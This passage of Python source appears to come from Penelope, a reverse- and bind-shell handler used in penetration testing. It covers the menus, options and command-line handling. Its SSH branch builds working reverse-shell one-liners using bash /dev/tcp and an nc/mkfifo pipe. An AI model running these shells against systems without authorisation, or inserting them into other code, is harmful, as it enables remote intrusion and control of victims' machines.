        try:
            with urlopen(req, timeout=5) as response:
                status_code = response.getcode()
        except HTTPError as e:
            all_ok = False
            status_code = e.code
        except:
            return None
        if __name__ == '__main__':
            color = 'RED' if status_code >= 400 else 'GREEN'
            print(f"{paint(url).cyan}{paint('.').DIM * (space_num - len(url))} => {getattr(paint(status_code), color)}")
    return all_ok

def listener_menu():
    if not core.listeners:
        return False

    listener_menu.active = True
    func = lambda: _
    listener_menu.control_r, listener_menu.control_w = os.pipe()

    listener_menu.finishing = threading.Event()

    while True:
        tty.setraw(sys.stdin)
        stdout(
            f"\r\x1b[?25l{paint('➤ ').white} "
            f"🏠 {paint('Main Menu').green} (m) "
            f"💀 {paint('Payloads').magenta} (p) "
            f"🔄 {paint('Clear').yellow} (Ctrl-L) "
            f"🚫 {paint('Quit').red} (q/Ctrl-C)\r\n".encode()
        )

        r, _, _ = select([sys.stdin, listener_menu.control_r], [], [])

        if sys.stdin in r:
            command = sys.stdin.read(1).lower()
            if command == 'm':
                func = menu.show
                break
            elif command == 'p':
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
                print()
                for listener in core.listeners.values():
                    print(listener.payloads, end='\n\n')
            elif command == '\x0C':
                os.system("clear")
            elif command in ('q', '\x03'):
                func = core.stop
                menu.stop = True
                break
            stdout(b"\x1b[1A")
            continue
        break

    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
    stdout(b"\x1b[?25h\r")
    func()
    os.close(listener_menu.control_r)
    listener_menu.active = False
    listener_menu.finishing.set()
    return True

def load_rc():
    RC = Path(options.basedir / "peneloperc")
    try:
        with open(RC, "r") as rc:
            exec(rc.read(), globals())
    except FileNotFoundError:
        RC.touch()
    os.chmod(RC, 0o600)

# fonts_installed moved to penelope_mod.system

# OPTIONS
class Options:
    log_levels = {"silent":'WARNING', "debug":'DEBUG'}

    def __init__(self):
        self.basedir = Path.home() / f'.{__program__}'
        self.default_listener_port = 4444
        self.default_bindshell_port = 5555
        self.default_fileserver_port = 8000
        self.default_interface = "0.0.0.0"
        self.payloads = False
        self.no_log = False
        self.no_timestamps = False
        self.no_colored_timestamps = False
        self.max_maintain = 10
        self.maintain = 1
        self.single_session = False
        self.no_attach = False
        self.no_upgrade = False
        self.debug = False
        self.dev_mode = False
        self.latency = .01
        self.histlength = 2000
        self.long_timeout = 60
        self.short_timeout = 4
        self.max_open_files = 5
        self.verify_ssl_cert = True
        self.proxy = ''
        self.upload_chunk_size = 51200
        self.download_chunk_size = 1048576
        self.network_buffer_size = 16384
        self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
        self.logfile = f"{__program__}.log"
        self.debug_logfile = "debug.log"
        self.cmd_histfile = 'cmd_history'
        self.debug_histfile = 'cmd_debug_history'
        self.useragent = "Wget/1.21.2"
        self.attach_lines = 20

    def __getattribute__(self, option):
        if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
            return self.basedir / super().__getattribute__(option)
#        if option == "basedir":
#            return Path(super().__getattribute__(option))
        return super().__getattribute__(option)

    def __setattr__(self, option, value):
        show = logger.error if 'logger' in globals() else lambda x: print(paint(x).red)
        level = __class__.log_levels.get(option)

        if level:
            level = level if value else 'INFO'
            logging.getLogger(__program__).setLevel(getattr(logging, level))

        elif option == 'maintain':
            if value > self.max_maintain:
                show(f"Maintain value decreased to the max ({self.max_maintain})")
                value = self.max_maintain
            if value < 1:
                value = 1
            #if value == 1: show("Maintain value should be 2 or above")
            if value > 1 and self.single_session:
                show("Single Session mode disabled because Maintain is enabled")
                self.single_session = False

        elif option == 'single_session':
            if self.maintain > 1 and value:
             show("Single Session mode disabled because Maintain is enabled")
             value = False

        elif option == 'no_bins':
            if value is None:
                value = []
            elif type(value) is str:
                value = re.split('[^a-zA-Z0-9]+', value)

        elif option == 'proxy':
            if not value:
                os.environ.pop('http_proxy', '')
                os.environ.pop('https_proxy', '')
            else:
                os.environ['http_proxy'] = value
                os.environ['https_proxy'] = value

        elif option == 'basedir':
            value.mkdir(parents=True, exist_ok=True)

        if hasattr(self, option) and getattr(self, option) is not None:
            new_value_type = type(value).__name__
            orig_value_type = type(getattr(self, option)).__name__
            if new_value_type == orig_value_type:
                self.__dict__[option] = value
            else:
                show(f"Wrong value type for '{option}': Expect <{orig_value_type}>, not <{new_value_type}>")
        else:
            self.__dict__[option] = value

def main():

    ## Command line options
    parser = ArgumentParser(description="Penelope Shell Handler", add_help=False,
        formatter_class=lambda prog: ArgumentDefaultsHelpFormatter(prog, width=150, max_help_position=40))

    parser.add_argument("-p", "--port", help=f"Port to listen/connect/serve, depending on -i/-c/-s options. \
        Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port}")
    parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell")

    method = parser.add_argument_group("Reverse or Bind shell?")
    method.add_argument("-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
    method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')

    hints = parser.add_argument_group("Hints")
    hints.add_argument("-a", "--payloads", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
    hints.add_argument("-l", "--interfaces", help="Show the available network interfaces", action="store_true")
    hints.add_argument("-h", "--help", action="help", help="show this help message and exit")

    log = parser.add_argument_group("Session Logging")
    log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
    log.add_argument("-T", "--no-timestamps", help="Do not include timestamps in session logs", action="store_true")
    log.add_argument("-CT", "--no-colored-timestamps", help="Do not color timestamps in session logs", action="store_true")

    misc = parser.add_argument_group("Misc")
    misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, metavar='')
    misc.add_argument("-M", "--menu", help="Just land to the Main Menu", action="store_true")
    misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
    misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
    misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")

    misc = parser.add_argument_group("File server")
    misc.add_argument("-s", "--serve", help="HTTP File Server mode", action="store_true")
    misc.add_argument("-prefix", "--url-prefix", help="URL prefix", type=str, metavar='')

    debug = parser.add_argument_group("Debug")
    debug.add_argument("-N", "--no-bins", help="Simulate binary absence on target (comma separated list)", metavar='')
    debug.add_argument("-v", "--version", help="Show Penelope version", action="store_true")
    debug.add_argument("-d", "--debug", help="Show debug messages", action="store_true")
    debug.add_argument("-dd", "--dev-mode", help="Developer mode", action="store_true")
    debug.add_argument("-cu", "--check-urls", help="Check health of hardcoded URLs", action="store_true")

    parser.parse_args(None, options)

    # Modify objects for testing
    if options.dev_mode:
        logger.critical("(!) THIS IS DEVELOPER MODE (!)")
        #stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
        #logger.setLevel('DEBUG')
        #options.max_maintain = 50
        #options.no_bins = 'python,python3,script'

    global keyboard_interrupt
    signal.signal(signal.SIGINT, lambda num, stack: core.stop())

    # Show Version
    if options.version:
        print(__version__)

    # Show Interfaces
    elif options.interfaces:
        print(Interfaces())

    # Check hardcoded URLs
    elif options.check_urls:
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        check_urls()

    # Main Menu
    elif options.menu:
        signal.signal(signal.SIGINT, keyboard_interrupt)
        menu.show()
        menu.start()

    # File Server
    elif options.serve:
        server = FileServer(*options.args or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
        if server.filemap:
            server.start()
        else:
            logger.error("No files to serve")

    # Reverse shell via SSH
    elif options.args and options.args[0] == "ssh":
        if len(options.args) > 1:
            TCPListener(host=options.interface, port=options.port)
            options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={options.port or options.default_listener_port};"
                f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
                f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
            )
        try:
            if subprocess.run(options.args).returncode == 0:
                logger.info("SSH command executed!")
                menu.start()
            else:
                core.stop()
                sys.exit(1)
        except Exception as e:
            logger.error(e)

    # Bind shell
    elif options.connect:
        if not Connect(options.connect, options.port or options.default_bindshell_port):
            sys.exit(1)
        menu.start()

    # Reverse Listener
    else:
        TCPListener(host=options.interface, port=options.port)
        if not core.listeners:
            sys.exit(1)

        listener_menu()
        signal.signal(signal.SIGINT, keyboard_interrupt)
        menu.start()

#################### PROGRAM LOGIC ####################

# Check Python version
if not sys.version_info >= (3, 6):
    print("(!) Penelope requires Python version 3.6 or higher (!)")
    sys.exit(1)

# Apply default options
options = Options()

# Loggers
## Add TRACE logging level
TRACE_LEVEL_NUM = 25
logging.addLevelName(TRACE_LEVEL_NUM, "TRACE")
logging.TRACE = TRACE_LEVEL_NUM
def trace(self, message, *args, **kwargs):
    if self.isEnabledFor(TRACE_LEVEL_NUM):
        self._log(TRACE_LEVEL_NUM, message, args, **kwargs)
logging.Logger.trace = trace

## Setup Logging Handlers
stdout_handler = logging.StreamHandler()
stdout_handler.setFormatter(CustomFormatter())
stdout_handler.terminator = ''

file_handler = logging.FileHandler(options.logfile)
file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
file_handler.setLevel('INFO') # ??? TODO
file_handler.terminator = ''

debug_file_handler = logging.FileHandler(options.debug_logfile)
debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)
debug_file_handler.terminator = ''

## Initialize Loggers
logger = logging.getLogger(__program__)
logger.addHandler(stdout_handler)
logger.addHandler(file_handler)
logger.addHandler(debug_file_handler)

cmdlogger = logging.getLogger(f"{__program__}_cmd")
cmdlogger.setLevel(logging.INFO)
cmdlogger.addHandler(stdout_handler)

# Set constants
# TTY and env constants
try:
    TTY_NORMAL = termios.tcgetattr(sys.stdin)
except termios.error:
    # Handle non-interactive environments
    TTY_NORMAL = [0, 0, 0, 0, 0, 0, 0]
MAX_CMD_PROMPT_LEN = 335
LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
# URL constants
URLS = URLS_CONST

# Python Agent code
GET_GLOB_SIZE = inspect.getsource(get_glob_size)
MESSENGER = inspect.getsource(Messenger)
STREAM = inspect.getsource(Stream)
AGENT = inspect.getsource(agent)

# Python modifications
original_input = input
input = my_input
sys.excepthook = custom_excepthook
threading.excepthook = custom_excepthook
tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
os.umask(0o007)
signal.signal(signal.SIGWINCH, WinResize)
keyboard_interrupt = signal.getsignal(signal.SIGINT)
try:
    import readline
    readline.parse_and_bind("tab: complete")
    default_readline_delims = readline.get_completer_delims()
except ImportError:
    readline = None
    default_readline_delims = None

## Create basic objects
core = Core()
menu = MainMenu(histfile=options.cmd_histfile, histlen=options.histlength)
start = menu.start
# Re-export for backward-compatibility
TCPListener = _TCPListener
Connect = _Connect
FileServer = _FileServer
Listener = TCPListener

# Set shared context for modular code
set_context(
    logger=logger,
    cmdlogger=cmdlogger,
    options=options,
    core=core,
    menu=menu,
    program=__program__,
    version=__version__,
    readline=readline,
    default_readline_delims=default_readline_delims,
    keyboard_interrupt=keyboard_interrupt,
    load_rc=load_rc,
)

# Check for installed emojis
if not fonts_installed():
    logger.warning("For showing emojis please install 'fonts-noto-color-emoji'")

# Load peneloperc
load_rc()

if __name__ == "__main__":
    main()
